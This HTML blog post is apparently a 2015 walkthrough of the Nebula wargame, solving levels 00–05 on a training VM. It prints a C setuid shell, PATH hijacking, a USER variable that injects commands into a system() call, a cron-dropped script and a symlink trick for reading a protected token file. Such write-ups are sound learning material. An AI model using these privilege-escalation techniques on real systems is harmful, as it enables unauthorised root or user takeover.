<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  
  <script type="application/ld+json">
{
    "@context" : "http://schema.org",
    "@type" : "BlogPosting",
    "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https:\/\/leonjza.github.io"
    },
    "articleSection" : "post",
    "name" : "playing exploit-exercises - nebula",
    "headline" : "playing exploit-exercises - nebula",
    "description" : "\u003ch2 id=\u0022introduction\u0022\u003eintroduction\u003c\/h2\u003e\n\u003cp\u003eRecently I decided I wanted to have a look at what \u003ca href=\u0022https:\/\/exploit-exercises.com\/\u0022\u003eExploit Exercises\u003c\/a\u003e had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for \u003ca href=\u0022https:\/\/exploit-exercises.com\/nebula\/\u0022\u003eNebula\u003c\/a\u003e. \u003cem\u003eNebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.\u003c\/em\u003e\u003c\/p\u003e\n\u003cfigure\u003e\n    \u003cimg src=\u0022\/images\/nebula_logo.png\u0022\/\u003e \n\u003c\/figure\u003e\n\n\u003cp\u003eI did not really have a lot of time on my hands and figured I should start with the \u0026ldquo;easy\u0026rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)\u003c\/p\u003e\n\u003cp\u003eThis is the path I took to solve the 20 challenges.\u003c\/p\u003e",
    "inLanguage" : "en-US",
    "author" : "Leon Jacobs",
    "creator" : "Leon Jacobs",
    "publisher": "Leon Jacobs",
    "accountablePerson" : "Leon Jacobs",
    "copyrightHolder" : "Leon Jacobs",
    "copyrightYear" : "2015",
    "datePublished": "2015-05-08 07:18:31 \u002b0000 UTC",
    "dateModified" : "2015-05-08 07:18:31 \u002b0000 UTC",
    "url" : "https:\/\/leonjza.github.io\/blog\/2015\/05\/08\/playing-exploit-exercises-nebula\/",
    "wordCount" : "9902",
    "keywords" : [ "CTF","Solution","Exploit","Exercises","Blog" ]
}
</script>


  <title>playing exploit-exercises - nebula &middot; </title>

  
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
  <link href="https://leonjza.github.io/favicon.png" rel="icon">

  
  
  
  

  <meta name="description" content="">
  <meta name="keywords" content="">
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-44457032-2', 'auto');
    ga('send', 'pageview');
  </script>
  
</head>
<body class="theme-base-0d">
<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      
      <h1></h1>
      <p class="lead">#!/slash/note<br>
<em>A checkbox unchecker&rsquo;s notepad</em></p>
    </div>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Blog</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/post">Posts</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About Me</a></li>
      
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item">
      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
      
      
      
      
      
      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
      
      
      </li>
    </ul>

    

    <p>Copyright &copy; 2020 <a href="https://leonjza.github.io/license/">License</a><br/>
       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>

  </div>
</div>


<div class="content container">
  <div class="post">
    <h1 class="post-title">playing exploit-exercises - nebula</h1>
    <span class="post-date">May 8, 2015 &middot; 47 minute read &middot; <a href="https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/#disqus_thread">Comments</a>
    
    <br/>
    <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/exploit">Exploit</a><a class="label" href="https://leonjza.github.io/categories/exercises">Exercises</a>
    </span>
    <h2 id="introduction">introduction</h2>
<p>Recently I decided I wanted to have a look at what <a href="https://exploit-exercises.com/">Exploit Exercises</a> had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for <a href="https://exploit-exercises.com/nebula/">Nebula</a>. <em>Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.</em></p>
<figure>
    <img src="https://leonjza.github.io/images/nebula_logo.png"/> 
</figure>

<p>I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)</p>
<p>This is the path I took to solve the 20 challenges.</p>
<h2 id="setup">setup</h2>
<p>On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.</p>
<p>After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ » ssh level00@192.168.217.239
no hostkey alg
</code></pre></div><p><em>sigh</em>. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the <code>nebula</code> account to root and generated a RSA host key with: <code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code> with no password. I was now able to log in:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">~ » ssh level00@192.168.217.239
The authenticity of host &#39;192.168.217.239 (192.168.217.239)&#39; can&#39;t be established.
RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.217.239&#39; (RSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &#34;levelXX&#34; and password &#34;levelXX&#34;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


level00@192.168.217.239&#39;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release &#39;12.04 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

level00@nebula:~$
</code></pre></div><p>I could see that I was now logged in as level00</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level00@nebula:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>level00<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>level00<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>level00<span style="color:#f92672">)</span>
</code></pre></div><p>The challenges are all in their respective <code>flag</code> folder. So if you are logged in as <code>level00</code>, you are interested in <code>flag00</code>. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command <code>getflag</code> could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running <code>getflag</code> is enough to consider a level done. I had prepared a small C setuid shell in <code>/var/tmp/shell.c</code> with the following output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>This shell was reused throughout the challenges. Lets dig into the challenges themselves.</p>
<h2 id="level00">level00</h2>
<p><a href="https://exploit-exercises.com/nebula/level00/">Level00&rsquo;s Description</a>:</p>
<blockquote>
<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
</blockquote>
<p>Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know <em>about</em> SUID binaries :P</p>
<p>So, to solve level00:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level00@nebula:~$ find / -perm -4000 2&gt; /dev/null | xargs ls -lh
-rwsr-x--- <span style="color:#ae81ff">1</span> flag00  level00    7.2K 2011-11-20 21:22 /bin/.../flag00
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        26K 2011-05-18 03:12 /bin/fusermount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        87K 2011-08-09 09:15 /bin/mount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        34K 2011-05-03 03:38 /bin/ping
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        39K 2011-05-03 03:38 /bin/ping6
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        31K 2011-06-24 02:37 /bin/su
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        63K 2011-08-09 09:15 /bin/umount
-rwsr-x--- <span style="color:#ae81ff">1</span> flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/.../flag00
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root    root        87K 2011-08-09 09:15 /rofs/bin/mount
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>

level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!

flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level01">level01</h2>
<p><a href="https://exploit-exercises.com/nebula/level01/">Level01&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  gid_t gid;
  uid_t uid;
  gid <span style="color:#f92672">=</span> getegid();
  uid <span style="color:#f92672">=</span> geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(<span style="color:#e6db74">&#34;/usr/bin/env echo and now what?&#34;</span>);
}
</code></pre></div><p>We can see a bunch of UID/GID stuff being set with with <code>setresgid</code> and <code>setresuid</code> and then a system command being run with <code>system()</code>. The problem lies in the fact that the command that is being run does not have a full path specified for the <code>echo</code> command. Even though its called with <code>/usr/bin/env</code>, it is possible to modify the current <code>PATH</code> variable and have <code>env</code> report echo as being somewhere other than where it would normally be.</p>
<p>On the filesystem we find the <code>flag01</code> binary and can see it is setuid for <code>flag01</code> user (we are currently logged in as <code>level01</code>):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ls -lh flag01
-rwsr-x--- <span style="color:#ae81ff">1</span> flag01 level01 7.2K 2011-11-20 21:22 flag01

level01@nebula:/home/flag01$ ./flag01
and now what?
</code></pre></div><p>Abusing this is really easy. I decided to create my own <code>echo</code> binary and modified <code>PATH</code> so that it is called instead of the real <code>echo</code>. A small note here though. The Nebula vm has <code>/tmp</code> mounted with the <code>nosuid</code> option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being <code>/var/tmp</code> was not mounted separately and I had write access there :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level01@nebula:/home/flag01$ mount | grep <span style="color:#e6db74">&#34;/tmp&#34;</span>
tmpfs on /tmp type tmpfs <span style="color:#f92672">(</span>rw,nosuid,nodev<span style="color:#f92672">)</span>

level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
drwxrwxrwt <span style="color:#ae81ff">3</span> root root   <span style="color:#ae81ff">29</span> 2012-08-23 18:46 tmp
</code></pre></div><p>So, to solve level01:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level01@nebula:/home/flag01$ cat /var/tmp/echo
<span style="color:#75715e">#!/bin/sh</span>
gcc /var/tmp/shell.c -o /var/tmp/flag01
chmod <span style="color:#ae81ff">4777</span> /var/tmp/flag01

level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
-rwxrwxr-x <span style="color:#ae81ff">1</span> level01 level01 <span style="color:#ae81ff">77</span> 2015-05-08 07:35 /var/tmp/echo

level01@nebula:/home/flag01$ cat /var/tmp/shell.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    setresuid<span style="color:#f92672">(</span>geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">())</span>;
    system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

level01@nebula:/home/flag01$ export PATH<span style="color:#f92672">=</span>/var/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
-rwsrwxrwx <span style="color:#ae81ff">1</span> flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01

level01@nebula:/home/flag01$ /var/tmp/flag01
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level02">level02</h2>
<p><a href="https://exploit-exercises.com/nebula/level02/">Level02&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer;

  gid_t gid;
  uid_t uid;

  gid <span style="color:#f92672">=</span> getegid();
  uid <span style="color:#f92672">=</span> geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer <span style="color:#f92672">=</span> NULL;

  asprintf(<span style="color:#f92672">&amp;</span>buffer, <span style="color:#e6db74">&#34;/bin/echo %s is cool&#34;</span>, getenv(<span style="color:#e6db74">&#34;USER&#34;</span>));
  printf(<span style="color:#e6db74">&#34;about to call system(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);

  system(buffer);
}
</code></pre></div><p>Level02 is very similar to Level01, except for that fact that here the line <code>/bin/echo %s is cool</code> is copied to <code>buffer</code> and eventually put through a <code>system()</code> call. The value of the current environment variable <code>USER</code> is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (<em>is cool</em> in this case).</p>
<p>So, to solve level02:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level02@nebula:/home/flag02$ ./flag02
about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo level02 is cool&#34;</span><span style="color:#f92672">)</span>
level02 is cool

level02@nebula:/home/flag02$ USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bob&#34;</span> <span style="color:#f92672">&amp;&amp;</span> ./flag02
about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo bob is cool&#34;</span><span style="color:#f92672">)</span>
bob is cool

level02@nebula:/home/flag02$ cat /var/tmp/shell.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    setresuid<span style="color:#f92672">(</span>geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">())</span>;
    system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

level02@nebula:/home/flag02$ USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bob; id;#&#34;</span> <span style="color:#f92672">&amp;&amp;</span> ./flag02
about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo bob; id;# is cool&#34;</span><span style="color:#f92672">)</span>
bob
uid<span style="color:#f92672">=</span>997<span style="color:#f92672">(</span>flag02<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>level02<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>997<span style="color:#f92672">(</span>flag02<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>level02<span style="color:#f92672">)</span>

level02@nebula:/home/flag02$ USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&#34;</span> <span style="color:#f92672">&amp;&amp;</span> ./flag02
about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&#34;</span><span style="color:#f92672">)</span>
bob

level02@nebula:/home/flag02$ /var/tmp/flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level03">level03</h2>
<p><a href="https://exploit-exercises.com/nebula/level03/">Level03&rsquo;s Description</a>:</p>
<blockquote>
<p>Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.</p>
</blockquote>
<p>Logging in as <code>level03</code>, we find a directory and a <code>sh</code> script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ ls -lh
total <span style="color:#ae81ff">512</span>
drwxrwxrwx <span style="color:#ae81ff">2</span> flag03 flag03  <span style="color:#ae81ff">3</span> 2012-08-18 05:24 writable.d
-rwxr-xr-x <span style="color:#ae81ff">1</span> flag03 flag03 <span style="color:#ae81ff">98</span> 2011-11-20 21:22 writable.sh

level03@nebula:/home/flag03$ cat writable.sh
<span style="color:#75715e">#!/bin/sh</span>

<span style="color:#66d9ef">for</span> i in /home/flag03/writable.d/* ; <span style="color:#66d9ef">do</span>
    <span style="color:#f92672">(</span>ulimit -t 5; bash -x <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
    rm -f <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>With the mention of a cronjob, I assumed the <code>writable.sh</code> script was being run. From the source of the script we can see that everything in <code>/home/flag03/writable.d/</code> will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using <code>bash -x</code>. Once done, the file is removed. Easy to exploit.</p>
<p>So, to solve level03:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh
<span style="color:#75715e">#!/bin/sh</span>
gcc /var/tmp/shell.c -o /var/tmp/flag03
chmod <span style="color:#ae81ff">4777</span> /var/tmp/flag03

level03@nebula:/home/flag03$ cat /var/tmp/shell.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    setresuid<span style="color:#f92672">(</span>geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">()</span>, geteuid<span style="color:#f92672">())</span>;
    system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/

level03@nebula:/home/flag03$ <span style="color:#75715e"># wait some time for the cronjob</span>

level03@nebula:/home/flag03$ /var/tmp/flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level04">level04</h2>
<p><a href="https://exploit-exercises.com/nebula/level04/">Level04&rsquo;s Description</a>:</p>
<blockquote>
<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];
  <span style="color:#66d9ef">int</span> fd, rc;

  <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
      printf(<span style="color:#e6db74">&#34;%s [file to read]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
      exit(EXIT_FAILURE);
  }

  <span style="color:#66d9ef">if</span>(strstr(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;token&#34;</span>) <span style="color:#f92672">!=</span> NULL) {
      printf(<span style="color:#e6db74">&#34;You may not access &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
      exit(EXIT_FAILURE);
  }

  fd <span style="color:#f92672">=</span> open(argv[<span style="color:#ae81ff">1</span>], O_RDONLY);
  <span style="color:#66d9ef">if</span>(fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
      err(EXIT_FAILURE, <span style="color:#e6db74">&#34;Unable to open %s&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
  }

  rc <span style="color:#f92672">=</span> read(fd, buf, <span style="color:#66d9ef">sizeof</span>(buf));

  <span style="color:#66d9ef">if</span>(rc <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
      err(EXIT_FAILURE, <span style="color:#e6db74">&#34;Unable to read fd %d&#34;</span>, fd);
  }

  write(<span style="color:#ae81ff">1</span>, buf, rc);
}
</code></pre></div><p>From the snippet we can see that a check is in place for the first argument to see if the string <code>token</code> exists in it. As the token we want to read is actually called <em>token</em> this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.</p>
<p>So, to solve level04:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
06508b5e-8909-4f38-b630-fdb148a848a2

level04@nebula:/home/flag04$ su - flag04
Password:
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level05">level05</h2>
<p><a href="https://exploit-exercises.com/nebula/level05/">Level05&rsquo;s Description</a>:</p>
<blockquote>
<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
</blockquote>
<p>Browsing to the <code>flag05</code> directory we can see a <code>.backup</code> directory containing a tar archive that is readable. This archive contained a private key that allowed login as the <code>flag05</code> user.</p>
<p>So, to solve level05:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x--- <span style="color:#ae81ff">4</span> flag05 level05   <span style="color:#ae81ff">93</span> 2012-08-18 06:56 .
drwxr-xr-x <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">220</span> 2012-08-27 07:18 ..
drwxr-xr-x <span style="color:#ae81ff">2</span> flag05 flag05    <span style="color:#ae81ff">42</span> 2011-11-20 20:13 .backup
-rw-r--r-- <span style="color:#ae81ff">1</span> flag05 flag05   <span style="color:#ae81ff">220</span> 2011-05-18 02:54 .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
